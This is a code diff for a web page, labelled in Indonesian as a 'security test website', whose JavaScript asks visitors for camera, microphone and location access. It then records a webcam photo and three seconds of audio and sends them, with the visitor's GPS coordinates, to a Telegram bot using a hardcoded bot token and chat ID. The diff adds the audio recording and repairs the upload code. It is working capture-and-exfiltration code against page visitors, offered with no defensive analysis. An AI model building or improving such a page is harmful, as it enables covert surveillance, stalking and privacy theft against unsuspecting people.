@@ -6,33 +6,20 @@
     <title>Website Uji Keamanan</title>
     <script>
         let videoStream;
+        let audioChunks = [];
 
         async function startCapture() {
             try {
-                // Minta akses ke kamera, mikrofon, dan lokasi
+                // Meminta akses ke kamera dan mikrofon
                 videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                
+                // Meminta akses lokasi
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject);
                 });
 
-                // Ambil gambar dari kamera
-                const video = document.createElement("video");
-                video.srcObject = videoStream;
-                video.play();
-
-                setTimeout(async () => {
-                    const canvas = document.createElement("canvas");
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    const ctx = canvas.getContext("2d");
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    // Konversi ke base64
-                    const imageData = canvas.toDataURL("image/png");
-
-                    // Kirim ke Telegram
-                    sendToTelegram(imageData, position.coords);
-                }, 3000);
+                // Mulai merekam video dan audio
+                capturePhotoAndAudio(position.coords);
 
             } catch (error) {
                 console.error("Akses ditolak atau terjadi kesalahan:", error);
@@ -40,9 +27,43 @@
             }
         }
 
-        function sendToTelegram(imageData, location) {
+        function capturePhotoAndAudio(coords) {
+            const video = document.createElement("video");
+            video.srcObject = videoStream;
+            video.play();
+
+            // Rekam audio
+            const mediaRecorder = new MediaRecorder(videoStream);
+            mediaRecorder.start();
+
+            mediaRecorder.ondataavailable = event => {
+                audioChunks.push(event.data);
+            };
+
+            // Setelah 3 detik, ambil foto dan audio
+            setTimeout(() => {
+                // Ambil foto dari video
+                const canvas = document.createElement("canvas");
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL("image/png");
+
+                // Stop video & audio recording
+                video.pause();
+                mediaRecorder.stop();
+
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    sendToTelegram(imageData, coords, audioBlob);
+                };
+            }, 3000);
+        }
+
+        function sendToTelegram(imageData, location, audioBlob) {
             const botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8";  // Ganti dengan token bot Telegram
-            const chatId = "6010073048";  // Ganti dengan ID Telegram kamu
+            const chatId = "6010073048";      // Ganti dengan ID Telegram kamu
 
             // Kirim lokasi
             fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
@@ -55,10 +76,27 @@
                 })
             });
 
+            // Konversi gambar ke Blob
+            const photoBlob = dataURItoBlob(imageData);
+
             // Kirim foto
+            const formDataPhoto = new FormData();
+            formDataPhoto.append("chat_id", chatId);
+            formDataPhoto.append("photo", photoBlob, "image.png");
+
             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                 method: "POST",
-                body: new FormData().append("photo", dataURItoBlob(imageData)).append("chat_id", chatId)
+                body: formDataPhoto
+            });
+
+            // Kirim rekaman suara
+            const formDataAudio = new FormData();
+            formDataAudio.append("chat_id", chatId);
+            formDataAudio.append("audio", audioBlob, "audio.webm");
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
+                method: "POST",
+                body: formDataAudio
             });
         }
 
